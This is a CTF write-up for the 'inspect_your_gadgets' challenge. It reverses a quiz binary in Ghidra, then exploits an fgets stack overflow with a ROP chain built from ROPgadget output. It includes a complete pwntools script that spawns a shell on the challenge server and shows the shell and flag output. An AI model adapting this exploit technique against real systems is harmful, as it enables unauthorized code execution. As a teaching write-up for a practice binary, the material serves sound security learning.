# inspect_your_gadgets

> Go Go Gadget! Welcome to the third annual Inspector Gadget Fan Convention. We've set up a special quiz this year to determine who the most skilled gadget wielder is. Can you utilize gadgets as well as Inspector Gadget and win the prize at the end?

## Solution

What else to do with [the provided binary](inspect-your-gadgets) than run it? :)
(maybe running arbitrary binaries without knowing what they do is a bad idea but eh it's CTF league lol)

```shell
$ ./inspect-your-gadgets
Welcome to the official unofficial Inspector gadget fan quiz version 1.1
Answer the questions correctly, and you'll be rewarded with a bop
Let's begin!

Question 1. Who was the original voice actor for Inspector Gadget?
    A. Gary Owens
    B. Matthew Broderick
    C. Don Adams
    D. Mel Blanc

Your answer here:
```

*googling noises* looks like Don Adams?

```
...
Your answer here: C

Question 2. What is Inspector Gadget's name?
    A. Jeremy Gadgeti
    B. Matthew Broderick
    C. Jacob Smith
    D. Johnathan Brown

Your answer here:
```

Okay if I have to keep googling things this is going to get real annoying real fast :)
Let's see if Ghidra gives us any clues (or the answers, I'll take anything haha).

### Ghidra time

Opening up the provided binary in Ghidra reveals a lot more functions than I thought, which I eventually realized was because we're dealing with a statically linked binary:

```shell
$ file inspect-your-gadgets
inspect-your-gadgets: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=0e753f5b697a40abd57fcd30e06500de7586fa2c, for GNU/Linux 3.2.0, not stripped
```

Luckily it's unstripped though, and the main function isn't too hard to find in Ghidra.
I'll just include it in disassembled form here for convenience:

```c
undefined8 main(void)

{
  int iVar1;

  setbuf((FILE *)_IO_2_1_stdout_,(char *)0x0);
  setbuf((FILE *)_IO_2_1_stdin_,(char *)0x0);
  puts("Welcome to the official unofficial Inspector gadget fan quiz version 1.1");
  puts("Answer the questions correctly, and you\'ll be rewarded with a bop");
  puts("Let\'s begin!\n");
  iVar1 = run_quiz();
  if (iVar1 == 0) {
    puts("Oops! You got that one wrong. Dr. Claw wins and it\'s all your fault. Shame!");
    puts("No bops for losers. Goodbye.");
  }
  else {
    give_reward();
  }
  fflush((FILE *)_IO_2_1_stdout_);
  sleep(1);
  return 0;
}
```

It seems to call two other functions, namely `run_quiz` and `give_reward`.
`run_quiz` has to return a nonzero number in order for `give_reward` to be called though, which I assume happens when you get all of the quiz questions right.

Upon inspecting `run_quiz`, I noticed a few things that could be useful that I've conveniently marked with arrows :)

```c
undefined8 run_quiz(void)

{
  int iVar1;
  undefined8 uVar2;

  puts("Question 1. Who was the original voice actor for Inspector Gadget?");
  puts("    A. Gary Owens");
  puts("    B. Matthew Broderick");
  puts("    C. Don Adams");
  puts("    D. Mel Blanc\n");
  printf("Your answer here: ");
  iVar1 = getchar();
  if ((char)iVar1 == 'C') { // <-----------
    do {
      iVar1 = getchar();
      if ((char)iVar1 == '\n') break;
    } while ((char)iVar1 != -1);
    putchar(10);
    puts("Question 2. What is Inspector Gadget\'s name?");
    puts("    A. Jeremy Gadgeti");
    puts("    B. Matthew Broderick");
    puts("    C. Jacob Smith");
    puts("    D. Johnathan Brown\n");
    printf("Your answer here: ");
    iVar1 = getchar();
    if ((char)iVar1 == 'D') { // <-----------
      do {
        iVar1 = getchar();
        if ((char)iVar1 == '\n') break;
      } while ((char)iVar1 != -1);
      putchar(10);
      puts("Question 3. What year was the first Inspector Gadget movie released?");
      puts("    A. 1999");
      puts("    B. Matthew Broderick");
      puts("    C. 1995");
      puts("    D. 2002\n");
      printf("Your answer here: ");
      iVar1 = getchar();
      if ((char)iVar1 == 'A') { // <-----------
        do {
          iVar1 = getchar();
          if ((char)iVar1 == '\n') break;
        } while ((char)iVar1 != -1);
        putchar(10);
        uVar2 = 1;
      }
      else {
        uVar2 = 0;
      }
    }
    else {
      uVar2 = 0;
    }
  }
  else {
    uVar2 = 0;
  }
  return uVar2;
}
```

Looks like the quiz question answers are C, D, then A.
I guess it wouldn't have been too bad to google those but disassembling the binary is more fun anyways :)

Also I might be wrong but I don't think Matthew Broderick is a year? Could be just me though :)

Let's verify that those are indeed the correct answers:

```shell
$ ./inspect-your-gadgets
Welcome to the official unofficial Inspector gadget fan quiz version 1.1
Answer the questions correctly, and you'll be rewarded with a bop
Let's begin!

Question 1. Who was the original voice actor for Inspector Gadget?
    A. Gary Owens
    B. Matthew Broderick
    C. Don Adams
    D. Mel Blanc

Your answer here: C

Question 2. What is Inspector Gadget's name?
    A. Jeremy Gadgeti
    B. Matthew Broderick
    C. Jacob Smith
    D. Johnathan Brown

Your answer here: D

Question 3. What year was the first Inspector Gadget movie released?
    A. 1999
    B. Matthew Broderick
    C. 1995
    D. 2002

Your answer here: A

Congratulations! You did it!
Enter your name for the scoreboard:
```

Neat! With this new knowledge of Inspector Gadget trivia we can now reach the `give_reward` function.
Here's what Ghidra disassembles it into:

```c
void give_reward(void)

{
  char local_28 [32];

  puts("Congratulations! You did it!");
  printf("Enter your name for the scoreboard: ");
  fgets(local_28,0x200,(FILE *)_IO_2_1_stdin_);
  printf("Congrats %s\n",local_28);
  puts("Here is your bop as promised: https://www.youtube.com/watch?v=EcF2LOaLgA0");
  puts("Goodbye!");
  return;
}
```

That `fgets` call looks interesting: up to 0x200 (512 in decimal) characters are read into `local_28` which only has an allocated capacity of 32.
It's be a shame if someone entered too many characters and caused a stack overflow :)

```
Congratulations! You did it!
Enter your name for the scoreboard: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Here is your bop as promised: https://www.youtube.com/watch?v=EcF2LOaLgA0
Goodbye!
Segmentation fault (core dumped)
```

### ROP time

We should probably have checked this earlier but I wonder which hardening measures `inspect-your-gadgets` has?

```shell
$ pwn checksec inspect-your-gadgets
[*] '/path/to/inspect-your-gadgets'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Huh, NX being enabled means stuff that we can write to isn't executable which is a shame.
It also says stack canary found, but I didn't see a `__stack_chk_fail` call in `give_reward`; I assume maybe libc had them enabled when compiling or something?

Despite those measures though, we can still overwrite the return address on the stack though so that instead of executing the rest of main we can execute any other code present in the binary.
Short sequences of assembly instructions followed by a `ret` instruction (also known as gadgets, hence the theme of this challenge :)) will prove especially useful, since we can chain them together to allow us to execute essentially arbitrary code.
Because we rely on `ret` (return) instructions, this is called return-oriented programming, or ROP for short.
ROP is useful since it allows us to get around things like NX, which prevent us from executing code from a buffer we have control over.
Stack canaries would probably make ROP more interesting but we don't have to worry about them in this case :)

Creating a ROP chain is easier said than done though, since you're limited to assembly present in the binary (and maybe any libraries it loads?).
Because our binary is statically linked though, we do have a lot to choose from :)

```shell
$ ROPgadget --binary inspect-your-gadgets
# lots of lines lol
0x0000000000447209 : xor rax, rax ; ret
0x00000000004100f3 : xor rdx, qword ptr [0x30] ; call rdx
0x00000000004100f2 : xor rdx, qword ptr fs:[0x30] ; call rdx

Unique gadgets found: 39632
```

Since we don't really know what we're looking for, we might as well get a shell via the `execve` syscall.
Based on [this online table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/), we need to set up the following registers before doing that:

- `rax` -> 59 (syscall number for `execve`)
- `rdi` -> pointer to the string "/bin/sh" (filename)
- `rsi` -> 0 (argv; we don't care about this)
- `rdx` -> 0 (envp; likewise)

In this case, the `pop` and `mov` instructions will be our friends in loading values into registers.
`pop` loads the top value on the stack into the register you provide it and decrements the stack pointer, while `mov` just copies a value from one register to another.
`mov` is especially useful when you can't directly pop into a register or when you're dealing with pointers.

The [`ROPgadget`](https://github.com/JonathanSalwan/ROPgadget) tool that I used above was really useful throughout this entire process, since it automatically locates every possible gadget you could want (as well as even more that you don't want).
You can also filter the gadgets it finds using several command line options: I used `--only "mov|pop|ret"` (to only match those instructions) and `--re <register>` when I was looking at manipulating specific registers.

Let's go through setting up each register one by one :)

#### rax - 59

Luckily for us, ROPgadget was able to find a `pop rax` gadget:

```shell
$ ROPgadget --binary inspect-your-gadgets --only "mov|pop|ret" --re "rax"
# --snip--
0x0000000000484dba : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000452477 : pop rax ; ret # <---- this is the one we want
0x000000000041e024 : pop rax ; ret 0xffff
0x0000000000476397 : pop rbp ; mov rax, r12 ; pop r12 ; pop r13 ; ret
# --snip--
```

This means that we can load the value 59 directly into the `rax` register without too much effort.
We just have to put the value 59 (packed to 8 bytes because this is a 64-bit binary) on the stack after the address to this gadget.

#### rdi - pointer to "/bin/sh"

This was probably the most difficult register to set up since we can't just load the string "/bin/sh" directly into rdi; it has to contain an address pointing to the string.
Luckily the `mov` instruction can deal with pointers by adding square brackets around a register name (e.g. `[rdi]`) to dereference the address stored inside it.
There's also different pointer sizes (?) that are available, which are represented by adding `byte ptr`, `dword ptr`, and `qword ptr` before the register in square brackets if that makes sense.
In our case we'd want a `mov qword ptr [rdi], ...` gadget since a `qword` is 8 bytes and there's going to be an 8-byte address stored in `rdi` (again, we have a 64-bit binary).

Initially we were going to try to use one that moved from the `r9` register, but we couldn't find any `pop r9` gadgets that ended in a `ret` instruction.
We eventually found one that moved from `rcx` instead, as well as an accompanying `pop rcx ; ret` gadget.

With all of that though, we still have to load an address that we can write to into `rdi`.
There is a `pop rdi ; ret` gadget that lets us load anything we want into it, but finding an address is more interesting.
We eventually settled on writing into the .bss section of the binary, which normally holds uninitialized static variables.
gdb (well, pwndbg) is nice enough to give us the locations of the different sections within our binary:

```shell
pwndbg> elf
0x400270 - 0x400290  .note.gnu.property
0x400290 - 0x4002b4  .note.gnu.build-id
0x4002b4 - 0x4002d4  .note.ABI-tag
0x4002d8 - 0x400518  .rela.plt
0x401000 - 0x40101b  .init
0x401020 - 0x4011a0  .plt
0x4011a0 - 0x4939b0  .text
0x4939b0 - 0x495644  __libc_freeres_fn
0x495644 - 0x495651  .fini
0x496000 - 0x4b22ec  .rodata
0x4b22ec - 0x4b22ed  .stapsdt.base
0x4b22f0 - 0x4bcb7c  .eh_frame
0x4bcb7c - 0x4bcc95  .gcc_except_table
0x4be0c0 - 0x4be0e0  .tdata
0x4be0e0 - 0x4be0f0  .init_array
0x4be0e0 - 0x4be120  .tbss
0x4be0f0 - 0x4be100  .fini_array
0x4be100 - 0x4c0ef4  .data.rel.ro
0x4c0ef8 - 0x4c0fe8  .got
0x4c1000 - 0x4c10d8  .got.plt
0x4c10e0 - 0x4c2b10  .data
0x4c2b10 - 0x4c2b58  __libc_subfreeres
0x4c2b60 - 0x4c3208  __libc_IO_vtables
0x4c3208 - 0x4c3210  __libc_atexit
0x4c3220 - 0x4c4958  .bss # <--- this is the address range we care about
0x4c4958 - 0x4c4980  __libc_freeres_ptrs
```

I just chose a small offset from the start of that range just in case bounds were treated weird, but that's probably not necessary :)

Combining all of that together, the following gadget addresses and values have to be added to our payload (something something 8 bytes 64 bit binary :)):

- 0x4019c2 (`pop rdi ; ret`)
- 0x4c3229 (address in .bss section with arbitrary offset, in this case 9)
- 0x404bd2 (`pop rcx ; ret`)
- /bin/sh followed by a null byte to make it 8 bytes
- 0x43b95b (`mov qword ptr [rdi], rcx ; ret`)

Now that we have that out of the way, we can move on to zeroing `rsi` and `rdx` :)

#### rsi (argv) and rdx (envp) - zeros all the way down

These are similar to setting up rax - ROPgadget is able to find pop gadgets for each of these registers:

```
0x000000000040f52e : pop rsi ; ret
0x00000000004018cf : pop rdx ; ret
```

We just need to add zeros after each address to pop into each of the registers.

### Bringing it all together

I'll just include [my solve script](pwnspect.py) here since it's probably more concise than summarizing all of that :)

```python
from pwn import *

if __name__ == "__main__":
    # p = process("./inspect-your-gadgets")
    p = remote("chal.ctf-league.osusec.org", 1311)

    # get all the questions right :)
    p.sendlineafter(b"here: ", b"C")
    p.sendlineafter(b"here: ", b"D")
    p.sendlineafter(b"here: ", b"A")

    # construct ROP payload
    bss_addr = p64(0x4c3220 + 9) # offset of 9 from start because why not :)

    payload = b"A" * 0x28 # buffer overflow up to just before return address

    # set up rax (syscall 59 -> execve)
    payload += p64(0x452477) # pop rax ; ret
    payload += p64(59)

    # set up rdi (pointer to string "/bin/sh")
    payload += p64(0x4019c2) # pop rdi ; ret
    payload += bss_addr
    payload += p64(0x404bd2) # pop rcx ; ret
    payload += b"/bin/sh\x00" # null terminator included to make it 8 bytes
    payload += p64(0x43b95b) # mov qword ptr [rdi], rcx ; ret

    # zero rsi (argv) and rdx (envp)
    payload += p64(0x40f52e) # pop rsi ; ret
    payload += p64(0)
    payload += p64(0x4018cf) # pop rdx ; ret
    payload += p64(0)

    payload += p64(0x4012d3) # syscall

    print(payload)

    # send payload!
    p.sendlineafter(b"scoreboard: ", payload)

    # ooo fancy prompt
    p.interactive(prompt=term.text.bold_red("pwn>") + " ")
```

Our payload consists of 40 `A`s to get a stack overflow, then a ROP chain in basically the same (arbitrary) order that I described above (rax -> rdi -> rsi -> rdx).
Oh, I also forgot to mention that we need to execute a `syscall` instruction for obvious reasons; ROPgadget was able to find one with ease :)

Let's try running this against the server!

```shell
$ python pwnspect.py
[+] Opening connection to chal.ctf-league.osusec.org on port 1311: Done
# this is our payload ⬇️
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw$E\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\xc2\x19@\x00\x00\x00\x00\x00)2L\x00\x00\x00\x00\x00\xd2K@\x00\x00\x00\x00\x00/bin/sh\x00[\xb9C\x00\x00\x00\x00\x00.\xf5@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xcf\x18@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd3\x12@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw$E
Here is your bop as promised: https://www.youtube.com/watch?v=EcF2LOaLgA0
Goodbye!
# this is where our shell kicks in
pwn> ls
flag
inspect-your-gadgets
pwn> cat flag
osu{90_90_9AD937_AR817rarY_C0d3_3x3Cu710N}
```

And there's our flag! (and [our bop](https://www.youtube.com/watch?v=EcF2LOaLgA0) :))

This challenge was lots of fun and I definitely learned a lot (even if it came at the cost of my sanity haha).
I probably would have enjoyed it more if I actually watched Inspector Gadget as a kid but it's not like I can change that :)